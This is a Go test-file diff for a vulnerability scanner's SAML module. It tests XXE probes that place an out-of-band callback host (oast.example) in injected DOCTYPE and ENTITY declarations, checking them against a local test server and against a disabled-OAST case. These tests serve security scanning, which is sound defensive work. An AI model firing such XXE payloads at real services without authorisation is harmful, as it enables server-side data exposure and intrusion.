@@ -2,8 +2,15 @@ package xml_saml_security
 
 import (
 	"encoding/base64"
+	"net/http"
+	"net/http/httptest"
+	"net/url"
 	"strings"
+	"sync"
 	"testing"
+
+	"github.com/vigolium/vigolium/pkg/modules/modkit"
+	"github.com/vigolium/vigolium/pkg/modules/modtest"
 )
 
 func TestDecodeSAML_PlainXML(t *testing.T) {
@@ -175,12 +182,12 @@ func TestInjectDOCTYPE(t *testing.T) {
 	doc, _ := ParseXML(xml)
 	decoded := &DecodedSAML{XMLContent: xml, IsBase64: false, IsCompressed: false}
 
-	payload, err := InjectDOCTYPE(doc, decoded)
+	payload, err := InjectDOCTYPE(doc, decoded, "http://oast.example/x")
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
 
-	expected := `<!DOCTYPE root SYSTEM "example.dtd"><Response><test/></Response>`
+	expected := `<!DOCTYPE root SYSTEM "http://oast.example/x"><Response><test/></Response>`
 	if payload != expected {
 		t.Errorf("expected %q, got %q", expected, payload)
 	}
@@ -191,7 +198,7 @@ func TestInjectDOCTYPE_WithXMLDeclaration(t *testing.T) {
 	doc, _ := ParseXML(xml)
 	decoded := &DecodedSAML{XMLContent: xml, IsBase64: false, IsCompressed: false}
 
-	payload, err := InjectDOCTYPE(doc, decoded)
+	payload, err := InjectDOCTYPE(doc, decoded, "http://oast.example/x")
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
@@ -210,7 +217,7 @@ func TestInjectDOCTYPE_ExistingDoctype(t *testing.T) {
 	doc, _ := ParseXML(xml)
 	decoded := &DecodedSAML{XMLContent: xml, IsBase64: false, IsCompressed: false}
 
-	_, err := InjectDOCTYPE(doc, decoded)
+	_, err := InjectDOCTYPE(doc, decoded, "http://oast.example/x")
 	if err == nil {
 		t.Error("expected error for existing DOCTYPE")
 	}
@@ -221,15 +228,15 @@ func TestInjectENTITY(t *testing.T) {
 	doc, _ := ParseXML(xml)
 	decoded := &DecodedSAML{XMLContent: xml, IsBase64: false, IsCompressed: false}
 
-	payload, err := InjectENTITY(doc, decoded)
+	payload, err := InjectENTITY(doc, decoded, "http://oast.example/x")
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
 
-	if !strings.Contains(payload, `<!DOCTYPE foo [ <!ENTITY uuid SYSTEM "uuid-123"> ]>`) {
+	if !strings.Contains(payload, `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://oast.example/x"> ]>`) {
 		t.Errorf("missing DOCTYPE ENTITY declaration in %q", payload)
 	}
-	if !strings.Contains(payload, `ID="&uuid;"`) {
+	if !strings.Contains(payload, `ID="&xxe;"`) {
 		t.Errorf("missing entity reference in %q", payload)
 	}
 }
@@ -239,7 +246,7 @@ func TestInjectENTITY_NoID(t *testing.T) {
 	doc, _ := ParseXML(xml)
 	decoded := &DecodedSAML{XMLContent: xml, IsBase64: false, IsCompressed: false}
 
-	_, err := InjectENTITY(doc, decoded)
+	_, err := InjectENTITY(doc, decoded, "http://oast.example/x")
 	if err == nil {
 		t.Error("expected error for missing ID attribute")
 	}
@@ -289,21 +296,117 @@ func TestDeflateCompressionRoundtrip(t *testing.T) {
 	}
 }
 
-func TestTruncateString(t *testing.T) {
-	tests := []struct {
-		input    string
-		maxLen   int
-		expected string
-	}{
-		{"short", 10, "short"},
-		{"exactly10!", 10, "exactly10!"},
-		{"longer than limit", 10, "longer tha..."},
+// fakeOAST is a stand-in OAST provider that returns a fixed host and records the
+// parameter names and injection types it was asked to generate URLs for.
+type fakeOAST struct {
+	host       string
+	enabled    bool
+	mu         sync.Mutex
+	params     []string
+	injections []string
+}
+
+func (f *fakeOAST) GenerateURL(_, paramName, injectionType, _, _ string) string {
+	f.mu.Lock()
+	f.params = append(f.params, paramName)
+	f.injections = append(f.injections, injectionType)
+	f.mu.Unlock()
+	return f.host
+}
+func (f *fakeOAST) Enabled() bool { return f.enabled }
+
+// samlParamValue is a small plain-XML SAML document (no DOCTYPE, with an ID
+// attribute so the ENTITY probe applies). DecodeSAML accepts plain XML, so the
+// module re-emits plain XML — keeping the injected OAST host literally visible on
+// the wire instead of buried in base64.
+func samlParamValue() string {
+	return `<Response ID="abc123"><Assertion>x</Assertion></Response>`
+}
+
+// recordingSAMLServer captures each SAMLResponse value it receives (URL-decoded
+// by Query().Get), so a test can assert the injected OAST host reached the wire.
+func recordingSAMLServer(seen *[]string, mu *sync.Mutex) *httptest.Server {
+	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if v := r.URL.Query().Get("SAMLResponse"); v != "" {
+			mu.Lock()
+			*seen = append(*seen, v)
+			mu.Unlock()
+		}
+		_, _ = w.Write([]byte("ok"))
+	}))
+}
+
+// TestScanPerInsertionPoint_OASTPlantsExternalEntity: with OAST enabled, the
+// module fires SAML payloads whose decoded XML embeds the unique OAST host in an
+// external DTD / external entity, and returns no synchronous finding (OAST is
+// async). It also labels the injection type as XXE so the poller classifies the
+// callback correctly.
+func TestScanPerInsertionPoint_OASTPlantsExternalEntity(t *testing.T) {
+	var mu sync.Mutex
+	var seen []string
+	srv := recordingSAMLServer(&seen, &mu)
+	defer srv.Close()
+
+	const host = "abc123unique.oast.example"
+	oast := &fakeOAST{host: host, enabled: true}
+
+	client := modtest.Requester(t)
+	rr := modtest.Request(t, srv.URL+"/acs?SAMLResponse="+url.QueryEscape(samlParamValue()))
+	ip := modtest.InsertionPoint(t, rr, "SAMLResponse")
+
+	res, err := New().ScanPerInsertionPoint(rr, ip, client, &modkit.ScanContext{OASTProvider: oast})
+	if err != nil {
+		t.Fatalf("ScanPerInsertionPoint: %v", err)
+	}
+	if len(res) != 0 {
+		t.Fatalf("expected 0 synchronous findings (OAST is async), got %d", len(res))
 	}
 
-	for _, tc := range tests {
-		result := truncateString(tc.input, tc.maxLen)
-		if result != tc.expected {
-			t.Errorf("truncateString(%q, %d) = %q, want %q", tc.input, tc.maxLen, result, tc.expected)
+	mu.Lock()
+	defer mu.Unlock()
+	hostHits := 0
+	for _, xmlDoc := range seen {
+		if strings.Contains(xmlDoc, host) &&
+			(strings.Contains(xmlDoc, "<!DOCTYPE") || strings.Contains(xmlDoc, "<!ENTITY")) {
+			hostHits++
 		}
+	}
+	if hostHits == 0 {
+		t.Fatalf("expected a SAML payload embedding the OAST host in a DTD/entity; saw %v", seen)
+	}
+	if len(oast.params) == 0 || oast.params[0] != "SAMLResponse" {
+		t.Errorf("expected GenerateURL called for SAMLResponse, got %v", oast.params)
+	}
+	for _, it := range oast.injections {
+		if !strings.Contains(strings.ToLower(it), "xxe") {
+			t.Errorf("expected XXE injection type, got %q", it)
+		}
+	}
+}
+
+// TestScanPerInsertionPoint_NoOAST_NoOp: without an OAST provider the module
+// sends nothing — confirmation is out-of-band only, with no heuristic fallback.
+func TestScanPerInsertionPoint_NoOAST_NoOp(t *testing.T) {
+	var mu sync.Mutex
+	var seen []string
+	srv := recordingSAMLServer(&seen, &mu)
+	defer srv.Close()
+
+	client := modtest.Requester(t)
+	rr := modtest.Request(t, srv.URL+"/acs?SAMLResponse="+url.QueryEscape(samlParamValue()))
+	ip := modtest.InsertionPoint(t, rr, "SAMLResponse")
+
+	res, err := New().ScanPerInsertionPoint(rr, ip, client, &modkit.ScanContext{})
+	if err != nil {
+		t.Fatalf("ScanPerInsertionPoint: %v", err)
+	}
+	if len(res) != 0 {
+		t.Fatalf("expected 0 findings, got %d", len(res))
+	}
+
+	mu.Lock()
+	defer mu.Unlock()
+	if len(seen) != 0 {
+		t.Fatalf("expected no requests with OAST disabled, saw %d", len(seen))
 	}
 }
